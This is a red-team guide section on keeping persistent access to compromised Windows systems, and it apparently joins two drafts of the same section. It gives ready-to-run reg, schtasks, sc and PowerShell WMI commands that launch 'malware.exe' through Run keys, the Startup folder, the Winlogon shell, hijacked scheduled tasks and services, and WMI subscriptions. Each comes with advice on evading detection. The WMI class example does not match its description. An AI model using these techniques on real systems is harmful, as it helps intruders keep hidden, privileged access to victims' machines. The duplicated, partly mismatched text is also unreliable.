3. Persistence Techniques for Windows
Overview

Persistence mechanisms enable an attacker to maintain a foothold in a compromised system. For Red Teams, employing a variety of persistence techniques is crucial to mimic real-world threats and evade detection by Blue Teams. This section covers multiple methods for achieving persistence on Windows systems, ranging from registry modifications to advanced techniques involving the Windows Task Scheduler, services, and less conventional methods like WMI Event Subscriptions.
A. Registry-Based Persistence

The Windows Registry is a hierarchical database that stores low-level settings for the operating system and applications. Modifying specific registry keys can allow attackers to execute malicious code upon system startup or user logon.
Techniques and Tools:

    Run/RunOnce Keys:
        Description: These registry keys are used to specify programs that should run automatically when a user logs in.
        Registry Paths:
            HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
            HKLM\Software\Microsoft\Windows\CurrentVersion\Run
            HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
        Tools: reg.exe, PowerShell.
        Example (Using reg.exe):

        shell

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\malware.exe" /f

Example (Using PowerShell):

powershell

    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyApp" -Value "C:\path\to\malware.exe"

    Recommendations:
        Use RunOnce keys to ensure the malware is executed once upon logon.
        Avoid leaving obvious traces by mimicking legitimate application names.

Startup Folder:

    Description: Files placed in the Startup folder will execute when the user logs in. This is a less stealthy method but still effective.
    Paths:
        For a specific user: C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
        For all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    Tools: File Explorer, copy command.
    Example:

    shell

    copy C:\path\to\malware.exe "C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"

    Recommendations:
        Name the executable to mimic legitimate software.
        Combine with other persistence methods for greater stealth.

Registry Shell Modification:

    Description: By modifying the registry entry that defines the Windows shell, attackers can ensure their payload is executed in place of or alongside explorer.exe.
    Registry Path:
        HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
        HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Tools: reg.exe, PowerShell.
    Example (Modifying the shell):

    shell

        reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d "explorer.exe,C:\path\to\malware.exe" /f

        Recommendations:
            Ensure the original shell (explorer.exe) is still executed to avoid disrupting user experience.
            This technique is more likely to be detected, so use in conjunction with other methods.

B. Windows Task Scheduler

The Windows Task Scheduler is a powerful tool that allows users and administrators to automate tasks. Attackers can abuse this feature to execute malicious code at scheduled intervals or during specific system events.
Techniques and Tools:

    Creating a Scheduled Task:
        Description: Schedule a task to run at system startup, user logon, or at specific intervals to maintain persistence.
        Tools: schtasks.exe, PowerShell.

        shell

schtasks /create /sc onlogon /tn "MyTask" /tr "C:\path\to\malware.exe" /ru System

Example (Using PowerShell):

powershell

    $action = New-ScheduledTaskAction -Execute "C:\path\to\malware.exe"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MyTask" -User "System"

    Recommendations:
        Use descriptive names for the task to avoid suspicion.
        Schedule tasks to run under the SYSTEM user for higher privileges.

Modifying Existing Scheduled Tasks:

    Description: Modify legitimate scheduled tasks to include malicious actions. This is stealthier than creating new tasks.
    Tools: schtasks.exe, PowerShell.
    Example:

    shell

        schtasks /change /tn "Microsoft\Windows\Defrag\ScheduledDefrag" /tr "C:\path\to\malware.exe"

        Recommendations:
            Select tasks that are less likely to be frequently reviewed or audited.
            Ensure that the original task function is not disrupted to avoid detection.

C. Service Installation

Windows services can be used to maintain persistence by configuring them to start automatically with the system.
Techniques and Tools:

    Installing a New Service:
        Description: Install a malicious service that runs automatically with system privileges.
        Tools: sc.exe, powershell.exe, reg.exe.
        Example (Using sc.exe):

        shell

sc create MyService binPath= "C:\path\to\malware.exe" start= auto

Example (Using PowerShell):

powershell

    New-Service -Name "MyService" -Binary "C:\path\to\malware.exe" -StartupType Automatic

    Recommendations:
        Use legitimate service names and descriptions to blend in.
        Ensure that the service is set to auto start type for persistence.

Modifying Existing Services:

    Description: Hijack an existing service by changing its executable path to point to malicious code.
    Tools: sc.exe, PowerShell, reg.exe.
    Example:

    shell

        sc config "ServiceName" binPath= "C:\path\to\malware.exe"

        Recommendations:
            Choose a service that is unlikely to be manually restarted by administrators.
            Ensure that the original service functionality is not interrupted to avoid drawing attention.

D. WMI Event Subscription

Windows Management Instrumentation (WMI) provides a powerful interface for managing data and operations on Windows systems. WMI Event Subscriptions can be abused to trigger actions in response to specific system events, such as user logon or system startup.
Techniques and Tools:

    Creating a WMI Event Subscription:
        Description: Set up an event subscription that triggers a malicious payload when a specific event occurs (e.g., user logon).
        Tools: PowerShell, wmic.exe.
        Example (Using PowerShell):

        powershell

        $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
          Name = "LogonTrigger"
          EventNamespace = "root\cimv2"
          Query = "SELECT * FROM Win32_LogonSession"
          QueryLanguage = "WQL"
        }

        $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
          Name = "LogonConsumer"
          CommandLineTemplate = "C:\path\to\malware.exe"
        }

        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
          Filter = $Filter
          Consumer = $Consumer
        }

        Recommendations:
            WMI Event Subscriptions are difficult to detect but can be identified by advanced monitoring solutions.
            Use descriptive names and conceal your intentions to avoid detection.

    Persistence through WMI Permanent Event Subscriptions:
        Description: Unlike temporary subscriptions, permanent subscriptions will survive system reboots and logoffs, making them a reliable persistence method.

Section 3: Persistence Techniques for Windows

Persistence techniques in Red Team operations are critical for maintaining access to a compromised system across reboots, user logouts, or other interruptions. These techniques allow attackers to ensure that their control over the target system remains intact, even if their initial entry vector is closed. In this section, we'll dive into various methods to achieve persistence on Windows systems, providing detailed explanations, examples, tools, and recommendations.
Overview

Persistence in Windows environments involves creating mechanisms that automatically start an attacker's payload or maintain backdoor access whenever the system is restarted or a user logs in. Achieving persistence is essential for long-term campaigns and can be done using various methods such as modifying registry keys, leveraging Windows services, scheduled tasks, and more. We'll cover these techniques in detail, along with the tools commonly used to implement them.
A. Registry-Based Persistence

Windows Registry is a hierarchical database used by the operating system to store low-level settings and configurations. Modifying specific registry keys can allow an attacker to execute malicious code every time the system starts or a user logs in.
Techniques and Tools:

    Run and RunOnce Keys:
        Description: The Run and RunOnce registry keys are used to execute programs automatically at user logon. By adding a malicious executable or script to these keys, persistence can be achieved.
        Registry Paths:
            HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
            HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        Tools: reg.exe (Windows built-in), PowerShell.
        Example (Using reg.exe):

        shell

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyMalware /t REG_SZ /d "C:\Path\to\malware.exe"

    Recommendations:
        Use obscure names for the registry value to avoid detection.
        Consider using the RunOnce key for one-time execution after reboot.

Startup Folder:

    Description: The Startup folder contains shortcuts to programs that are launched when the user logs in. Placing a malicious script or shortcut here ensures it runs automatically.
    Paths:
        %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
    Tools: copy command, PowerShell.
    Example (Using copy):

    shell

    copy C:\Path\to\malware.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

    Recommendations:
        Use benign-looking filenames for the shortcut.
        Consider embedding the payload in a legitimate application shortcut.

Registry Shell Spawning:

    Description: By modifying the default shell or file association settings in the registry, attackers can execute their payload when certain system events occur (e.g., user logs in or a specific file type is opened).
    Registry Paths:
        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
    Tools: reg.exe, PowerShell.
    Example (Modifying the shell):

    shell

        reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Path\to\malware.exe"

        Recommendations:
            Test carefully, as modifying the shell can disrupt system functionality if done incorrectly.

B. Scheduled Tasks

Scheduled tasks in Windows can be configured to execute commands or scripts at specific times or in response to events, making them a powerful method for persistence.
Techniques and Tools:

    Creating a Scheduled Task:
        Description: Scheduled tasks can be set up to run at system startup, user logon, or on a recurring schedule, ensuring the attacker’s code is executed regularly.
        Tools: schtasks.exe (Windows built-in), PowerShell.
        Example (Using schtasks.exe):

        shell

schtasks /create /sc onlogon /tn "MyTask" /tr "C:\Path\to\malware.exe"

Example (Using PowerShell):

powershell

    $Action = New-ScheduledTaskAction -Execute "C:\Path\to\malware.exe"
    $Trigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "MyTask" -User "SYSTEM"

    Recommendations:
        Use descriptive names that blend in with legitimate tasks.
        Schedule tasks during times when the user is less likely to notice them.

Modifying Existing Tasks:

    Description: Instead of creating new tasks, attackers can modify existing ones to include their payload, reducing the chance of detection.
    Tools: schtasks.exe, PowerShell.
    Example (Modifying an existing task):

    shell

        schtasks /change /tn "SomeLegitTask" /tr "C:\Path\to\malware.exe"

        Recommendations:
            Carefully choose tasks that run regularly but aren't closely monitored.
            Restore the original task configuration after execution if stealth is a priority.

C. Windows Services

Windows services run in the background and can be configured to start automatically with the system, providing a high-privilege, persistent execution environment for attackers.
Techniques and Tools:

    Creating a Malicious Service:
        Description: Attackers can create a new Windows service that points to their malicious executable. Once the service is started, it will persist across reboots.
        Tools: sc.exe (Service Control Manager), PowerShell.
        Example (Using sc.exe):

        shell

sc create MyService binPath= "C:\Path\to\malware.exe" start= auto
sc start MyService

Example (Using PowerShell):

powershell

    New-Service -Name "MyService" -Binary "C:\Path\to\malware.exe" -StartupType Automatic
    Start-Service -Name "MyService"

    Recommendations:
        Use names and descriptions that blend in with legitimate system services.
        Ensure the service runs under the SYSTEM account for higher privileges.

Hijacking Existing Services:

    Description: Instead of creating a new service, attackers can modify the binary path of an existing service to point to their malware.
    Tools: sc.exe, PowerShell.
    Example (Modifying an existing service):

    shell

        sc config SomeLegitService binPath= "C:\Path\to\malware.exe"
        sc start SomeLegitService

        Recommendations:
            Choose services that are automatically started but not closely monitored.
            Consider restoring the original service after use to avoid detection.

D. WMI (Windows Management Instrumentation) Persistence

WMI is a powerful administrative feature in Windows that can be leveraged by attackers to create event-based persistence mechanisms.
Techniques and Tools:

    Creating a WMI Event Subscription:
        Description: WMI event subscriptions can be used to trigger the execution of malicious code in response to specific system events (e.g., user login, system startup).
        Tools: wmic, PowerShell, custom WMI scripts.
        Example (Using PowerShell):

        powershell

    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
        Name = "MyEventFilter"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
    }

    $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
        Name = "MyConsumer"
        CommandLineTemplate = "C:\Path\to\malware.exe"
    }

    Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }

    Recommendations:
        Choose WMI events that occur frequently but are not typically monitored.
        Use obfuscation techniques to disguise the WMI query and command.

Modifying Existing WMI Classes:

    Description: Attackers can modify existing WMI classes or create new ones that execute their payload in response to standard system operations.
    Tools: PowerShell, wbemtest.exe.
    Example (Modifying an existing WMI class):

    powershell

        Get-WmiObject -Namespace "root\cimv2" -Class Win32_Process | ForEach-Object {
            $_.Create("C:\Path\to\malware.exe")
        }

        Recommendations:
            Modify less frequently used WMI classes to avoid detection.
            Regularly monitor WMI activity to ensure persistence mechanisms remain undetected.

E. DLL Hijacking

DLL hijacking is a technique where attackers place a malicious DLL in a location that is loaded by a legitimate application, achieving persistence.
